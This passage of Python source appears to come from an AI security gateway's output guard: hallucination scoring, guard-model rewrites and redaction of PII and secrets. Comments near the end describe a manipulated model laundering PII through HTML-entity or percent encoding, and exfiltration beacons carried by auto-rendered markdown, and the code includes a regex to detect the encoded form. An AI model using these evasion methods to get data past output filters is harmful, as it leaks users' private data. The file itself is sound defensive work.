        pattern_count = sum(1 for _k in found if _k not in _HEDGE_MARKERS)
        pattern_score = min(pattern_count * 0.15, 1.0)

        cfg = org_config or self._config
        mode = str(cfg.get("hallucination_grounding_mode", "lexical") or "lexical").lower()

        grounding_score = 1.0
        if context_chunks:
            grounding_score = await self._compute_grounding_score_with_mode(
                output_text,
                context_chunks,
                mode=mode,
                org_slug=org_slug,
            )

        contradiction_score = (
            self._detect_contradictions(output_text) if context_chunks else 0.0
        )

        if context_chunks:
            risk = (
                pattern_score * 0.25
                + (1.0 - grounding_score) * 0.50
                + contradiction_score * 0.25
            )
        else:
            risk = pattern_score * 0.80

        return HallucinationScore(
            risk_score=round(min(risk, 1.0), 3),
            pattern_score=round(pattern_score, 3),
            grounding_score=round(grounding_score, 3),
            contradiction_score=round(contradiction_score, 3),
            matched_markers=list(found.keys()),
            detail=(
                f"hallucination_risk={risk:.3f} "
                f"(pattern={pattern_score:.2f}, "
                f"grounding={grounding_score:.2f} [{mode}], "
                f"contradiction={contradiction_score:.2f})"
            ),
        )

    async def _compute_grounding_score_with_mode(
        self,
        output_text: str,
        context_chunks: list[str],
        *,
        mode: str,
        org_slug: str,
    ) -> float:
        """Algorithm dispatcher for ``hallucination_grounding_mode``.

        Returns a float in ``[0.0, 1.0]`` where higher == better-grounded
        (matches the legacy lexical-Jaccard contract used by
        ``score_hallucination``).

        Fail-open behavior: any semantic-path failure (no guard attached,
        circuit OPEN, embedder error) silently falls back to the lexical
        result so the gateway never blocks on grounding-pipeline outages.
        """
        lexical = self._compute_grounding_score(output_text, context_chunks)

        # Fast paths
        if mode == "lexical" or self._grounding_guard is None:
            return lexical
        if mode not in {"semantic", "hybrid"}:
            return lexical

        try:
            semantic = await self._grounding_guard.score(
                answer_text=output_text,
                context_chunks=list(context_chunks),
                org_slug=org_slug,
                assume_redacted=True,  # caller MUST have already redacted
            )
        except Exception:  # noqa: BLE001 — fail-OPEN to lexical
            LOG.exception(
                "OutputGuard: semantic grounding failed; falling back to lexical"
            )
            return lexical

        if semantic is None:
            return lexical

        if mode == "semantic":
            return float(semantic)
        # hybrid
        return float((lexical + semantic) / 2.0)

    @staticmethod
    def _compute_grounding_score(output: str, context_chunks: list[str]) -> float:
        """Compute lexical grounding score using token-level overlap."""
        output_tokens = set(output.lower().split())
        if not output_tokens:
            return 1.0

        context_tokens: set[str] = set()
        for chunk in context_chunks:
            context_tokens.update(chunk.lower().split())

        if not context_tokens:
            return 0.5

        output_meaningful = output_tokens - _STOPWORDS
        if not output_meaningful:
            return 1.0

        overlap = output_meaningful & context_tokens
        return len(overlap) / len(output_meaningful)

    @staticmethod
    def _detect_contradictions(text: str) -> float:
        """Detect self-contradictions within text. Returns 0.0-1.0."""
        sentences = re.split(r"[.!?]+", text)
        sentences = [s.strip().lower() for s in sentences if len(s.strip()) > 10]

        if len(sentences) < 2:
            return 0.0

        contradiction_signals = 0
        for sentence in sentences:
            for pattern in _CONTRADICTION_PATTERNS:
                if pattern.search(sentence):
                    contradiction_signals += 1
                    break

        return min(contradiction_signals * 0.2, 1.0)

    @staticmethod
    def _select_highest_severity(verdicts: list[OutputVerdict]) -> OutputVerdict:
        """Select the verdict with the highest-priority action."""
        return max(verdicts, key=lambda v: ACTION_PRIORITY.get(v.action, 0))


def _static_rewrite_text(threat_type: str, detail: str | None = None) -> str:
    """Deterministic canned replacement text — the safe fallback when a genuine
    content-preserving rewrite is unavailable (no client / inference failed)."""
    safe_templates = {
        "hallucination": (
            "I cannot verify that claim from the available evidence. "
            "Please confirm it with authoritative sources or request grounded citations."
        ),
        "pii": "Sensitive personal information was removed from the generated response.",
        "secret": "Sensitive credentials or secrets were removed from the generated response.",
        "credential": "Sensitive credentials or secrets were removed from the generated response.",
        "ip_leakage": "Sensitive infrastructure details were removed from the generated response.",
        "policy_violation": "The original model output was rewritten to comply with response safety policy.",
    }
    base_message = safe_templates.get(threat_type or "", safe_templates["policy_violation"])
    if detail and threat_type == "hallucination":
        return f"{base_message} Review detail: {detail}"
    return base_message


# Per-threat instruction injected into the sanitization system prompt so the
# rewrite removes only the offending content while preserving the rest of the
# answer's meaning.
_REWRITE_THREAT_GUIDANCE = {
    "pii": (
        "Remove or redact every piece of personal data (names, emails, phone "
        "numbers, SSNs, addresses, account numbers). Replace each with a neutral "
        "placeholder like [redacted]. Keep all other information intact."
    ),
    "secret": (
        "Remove every credential, password, API key, token, or secret value. "
        "Replace each with [redacted]. Preserve the surrounding explanation."
    ),
    "credential": (
        "Remove every credential, password, API key, token, or secret value. "
        "Replace each with [redacted]. Preserve the surrounding explanation."
    ),
    "ip_leakage": (
        "Remove internal IP addresses, private hostnames, and sensitive "
        "infrastructure file paths. Generalize them (e.g. 'an internal server'). "
        "Keep the rest of the answer intact."
    ),
    "hallucination": (
        "Remove unverifiable or fabricated claims and citations. Keep only "
        "statements supported by the surrounding context, and add a brief note "
        "that unverified details were omitted."
    ),
    "policy_violation": (
        "Rewrite the response so it complies with safety policy while preserving "
        "as much of the original useful meaning as possible."
    ),
}

_REWRITE_SYSTEM_PROMPT = (
    "You are an output-sanitization assistant for an AI security gateway. You are "
    "given a model response that violated a safety policy. Rewrite it so the "
    "specific sensitive or unsafe content is removed or neutralized, while "
    "PRESERVING the meaning, tone, and usefulness of everything else. Do not add "
    "commentary, apologies, or meta explanations beyond what is requested. Output "
    "ONLY the rewritten response text."
)

_MAX_REWRITE_INPUT_CHARS = 8000


def _content_preserving_rewrite(
    threat_type: str,
    original_text: str,
    *,
    bedrock_client,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str | None:
    """Re-infer a sanitized version of ``original_text`` via the guard model.

    Returns the rewritten text on success, or ``None`` if inference is
    unavailable / failed (callers fall back to the static template). The result
    is always passed through ``redact_all`` as a final deterministic safety net
    so a residual PII/secret value can never slip through the rewrite.
    """
    if not original_text or bedrock_client is None:
        return None

    guidance = _REWRITE_THREAT_GUIDANCE.get(
        threat_type or "", _REWRITE_THREAT_GUIDANCE["policy_violation"]
    )
    snippet = original_text[:_MAX_REWRITE_INPUT_CHARS]
    user_parts = [f"Violation type: {threat_type or 'policy_violation'}", f"Instruction: {guidance}"]
    if context_chunks:
        joined = " ".join(str(c) for c in context_chunks)[:2000]
        if joined.strip():
            user_parts.append(f"Grounding context (use only this for factual claims):\n{joined}")
    user_parts.append(f"Original response to rewrite:\n{snippet}")
    user_text = "\n\n".join(user_parts)

    try:
        result = bedrock_client.converse(
            model=model_id or "",
            system_text=_REWRITE_SYSTEM_PROMPT,
            user_text=user_text,
            max_tokens=1024,
            temperature=0.0,
            call_site="output_rewrite",
        )
    except Exception:  # noqa: BLE001 — rewrite must never raise into the response path
        LOG.exception("OutputGuard: content-preserving rewrite inference failed")
        return None

    rewritten = _extract_converse_text(result)
    if not rewritten or not rewritten.strip():
        return None
    # Final deterministic safety net: never let a residual secret/PII survive.
    return redact_all(rewritten.strip())


def _extract_converse_text(result) -> str:
    """Pull the assistant text out of a BedrockClient.converse() result dict."""
    try:
        choices = (result or {}).get("raw", {}).get("choices") or []
        if not choices:
            return ""
        message = choices[0].get("message") or {}
        content = message.get("content")
        if isinstance(content, str):
            return content
        if isinstance(content, list):
            # OpenAI-style content blocks.
            parts = [
                blk.get("text", "")
                for blk in content
                if isinstance(blk, dict)
            ]
            return "".join(parts)
        return str(content or "")
    except Exception:  # noqa: BLE001
        return ""


def rewrite_output_response_text(
    threat_type: str,
    detail: str | None = None,
    *,
    original_text: str | None = None,
    bedrock_client=None,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str:
    """Produce the replacement text for an output-guard rewrite action.

    Backward-compatible: called with only ``(threat_type, detail)`` it returns
    the deterministic canned text (unchanged legacy behavior). When
    ``original_text`` and a ``bedrock_client`` are supplied, it performs a
    genuine content-preserving LLM re-inference that redacts/neutralizes the
    offending content while preserving the rest of the response, falling back to
    the canned text if inference is unavailable or fails.
    """
    if original_text and bedrock_client is not None:
        rewritten = _content_preserving_rewrite(
            threat_type,
            original_text,
            bedrock_client=bedrock_client,
            model_id=model_id,
            context_chunks=context_chunks,
        )
        if rewritten:
            return rewritten
    return _static_rewrite_text(threat_type, detail)


async def rewrite_output_response_text_async(
    threat_type: str,
    detail: str | None = None,
    *,
    original_text: str | None = None,
    bedrock_client=None,
    model_id: str | None = None,
    context_chunks: list[str] | None = None,
) -> str:
    """Async wrapper around :func:`rewrite_output_response_text`.

    Offloads the blocking boto3 ``converse`` call to a thread so it can be
    awaited from the async gateway request path without blocking the event
    loop. Intended call site: ``main.py`` output-guard rewrite handling.
    """
    if not (original_text and bedrock_client is not None):
        return _static_rewrite_text(threat_type, detail)

    import asyncio
    import functools

    loop = asyncio.get_event_loop()
    func = functools.partial(
        rewrite_output_response_text,
        threat_type,
        detail,
        original_text=original_text,
        bedrock_client=bedrock_client,
        model_id=model_id,
        context_chunks=context_chunks,
    )
    return await loop.run_in_executor(None, func)


# G35: runs of HTML character-references or percent-encodings long enough to carry
# a PII/secret value. A manipulated model can emit PII as &#..; / %.. so the raw
# value never appears in the egress bytes, yet a browser/markdown renderer auto-
# decodes it back to the PII. Mask the whole encoded run (not the value inside it),
# so no position-mapping is needed. Benign entity/percent runs (colour hex, emoji,
# ©/™, url path segments) do NOT decode to a PII/secret pattern and are preserved.
_ENCODED_PII_RUN_RE = re.compile(
    r"(?:&#x?[0-9a-fA-F]{1,6};){6,}|(?:%[0-9a-fA-F]{2}){6,}"
)


def _decode_encoded_run(run: str) -> str:
    def _cp(n: int) -> str:
        return chr(n) if 0 <= n < 0x110000 else ""
    s = re.sub(r"&#x([0-9a-fA-F]{1,6});", lambda m: _cp(int(m.group(1), 16)) or m.group(0), run)
    s = re.sub(r"&#(\d{1,7});", lambda m: _cp(int(m.group(1))) or m.group(0), s)
    s = re.sub(r"%([0-9a-fA-F]{2})", lambda m: _cp(int(m.group(1), 16)) or m.group(0), s)
    return s


def neutralize_encoded_pii(text: str) -> str:
    """Mask HTML-entity / percent-encoded runs in model output that DECODE to a
    PII/secret value (output-side laundering; symmetric to input G33). Strict no-op
    on benign encoded runs. Bounded single-pass regex (ReDoS-safe)."""
    if not text or ("&#" not in text and "%" not in text):
        return text

    def _sub(m: "re.Match[str]") -> str:
        decoded = _decode_encoded_run(m.group(0))
        if detect_pii(decoded) or detect_secrets(decoded):
            return "[ENCODED_PII_REDACTED]"
        return m.group(0)

    try:
        return _ENCODED_PII_RUN_RE.sub(_sub, text)
    except Exception:  # noqa: BLE001 - sanitizer must never break the egress
        return text


def sanitize_output_for_verdict(
    response_text: str,
    verdict: OutputVerdict,
    *,
    redact_pii_fn=None,
) -> str:
    """Apply the correct sanitization for an output-guard verdict action.

    G13: whatever category won the verdict, the egress is ALWAYS passed through
    :func:`neutralize_exfil_channels` FIRST as a defense-in-depth pass, so a
    data-exfiltration beacon can never ride out alongside (e.g.) a PII redact when
    the PII verdict was selected. Neutralize runs BEFORE core redaction so it sees
    the original (unmasked) URL — otherwise masking the payload first would hide
    the exfil signal and leave the auto-render intact. No-op on benign markdown/URLs.
    G35 adds a symmetric encoded-PII neutralization pass (HTML-entity / percent runs
    that decode to a PII/secret) so a laundered-output exfil can't ride out either.
    """
    neutralized = neutralize_exfil_channels(response_text)
    neutralized = neutralize_encoded_pii(neutralized)
    return _sanitize_output_core(neutralized, verdict, redact_pii_fn=redact_pii_fn)


def _sanitize_output_core(
    response_text: str,
    verdict: OutputVerdict,
    *,
    redact_pii_fn=None,
) -> str:
    """Category-specific sanitization for an output-guard verdict action."""
    threat = str(verdict.threat_type or "")
    action = str(verdict.action or "allow")
    # G13: an exfil-channel verdict is fixed by the wrapper's neutralize pass
    # (defang the beacon in place). Here just mask any incidental PII while keeping
    # the rest of the answer — never nuke the whole response to [REDACTED].
    if threat == "exfil_channel":
        return redact_pii_fn(response_text) if redact_pii_fn is not None else response_text
    # 1.7: PII / secret / credential (+ pci / phi — C-1) are ALWAYS surgically
    # redacted (deterministic token-level masking via redact_pii_fn), never
    # routed through the non-deterministic "rewrite" path — regardless of action.
    if threat in _REDACTABLE_OUTPUT_CATEGORIES:
        base = redact_pii_fn(response_text) if redact_pii_fn is not None else "[REDACTED]"
        # G10: the deterministic redactor above has no regex for semantically-detected
        # PII/secret (free-text names, non-standard layouts, passphrases). Mask the
        # tier-2 guard model's identified spans (+ any raw matched_values that survived)
        # with a typed placeholder so the redact actually removes the bytes instead of
        # being a no-op that egresses raw.
        spans = list(verdict.redaction_spans or []) + [
            str(v) for v in (verdict.matched_values or {}).values()
        ]
        return _mask_spans_typed(base, spans, threat)
    # E15: internal infrastructure leakage (internal IP / hostname / URL) is
    # surgically masked via the deterministic redactor — never whole-response
    # rewritten — so a REAL internal address that survived FP suppression cannot
    # egress raw on the client channel, regardless of the configured action
    # (flag/redact). Kept OUT of _REDACTABLE_OUTPUT_CATEGORIES so an org's explicit
    # opt-in hard 'block' is preserved (that set also drives the block->redact
    # downgrade, which must NOT fire for an opt-in IP block).
    if threat == "ip_leakage":
        if redact_pii_fn is not None:
            return redact_pii_fn(response_text)
        return response_text
    if action == "rewrite":
        return rewrite_output_response_text(threat, verdict.detail or None)
    if action != "redact":
        return response_text
    if threat == "hallucination":
        return rewrite_output_response_text(threat, verdict.detail or None)
    if redact_pii_fn is not None:
        return redact_pii_fn(response_text)
    return "[REDACTED]"


def output_guard_telemetry_meta(
    verdict: OutputVerdict,
    *,
    raw_output: str,
    sanitized_output: str,
) -> dict:
    """Shared telemetry fields for output-guard incidents."""
    return {
        "detail": verdict.detail,
        "response_snippet": raw_output,
        "raw_output": raw_output,
        "sanitized_output": sanitized_output,
        "guardrail_reasoning": verdict.detail,
        "matched_patterns": list(verdict.matched_patterns or []),
        # AUDIT-2: matched_values previously persisted the RAW matched PII/secret into
        # EnforcementEvent.metadata.extra.matched_values (a dict, so it escaped the
        # telemetry.py _TEXT_KEYS scrub). Mask each value here at the source — the
        # operator console still gets matched_patterns + a masked value, never raw PII.
        "matched_values": {k: _mask_value_for_detail(str(v)) for k, v in (verdict.matched_values or {}).items()},
        "output_snippet_truncated": True,
        "full_output_scanned": True,
    }
